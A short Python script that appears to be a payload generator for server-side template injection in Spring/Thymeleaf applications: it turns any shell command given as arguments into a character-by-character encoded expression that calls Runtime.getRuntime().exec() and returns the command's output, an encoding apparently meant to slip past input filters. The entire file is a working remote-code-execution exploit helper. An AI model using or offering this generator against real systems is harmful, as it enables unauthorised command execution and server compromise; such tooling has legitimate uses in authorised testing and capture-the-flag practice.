#!/usr/bin/python3

import sys



pay_in = ""
if(len(sys.argv) > 1):
    for i in range(1, len(sys.argv)):
        pay_in += sys.argv[i]

pay_out = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("
i = 0
for pay_char in pay_in:
    pay_int = ord(pay_char)
    if i == 0:
        pay_out += "T(java.lang.Character).toString({0})".format(pay_int)
    else:
        pay_out += ".concat(T(java.lang.Character).toString({0}))".format(pay_int)
    i += 1

pay_out += ").getInputStream())}"
print(pay_out)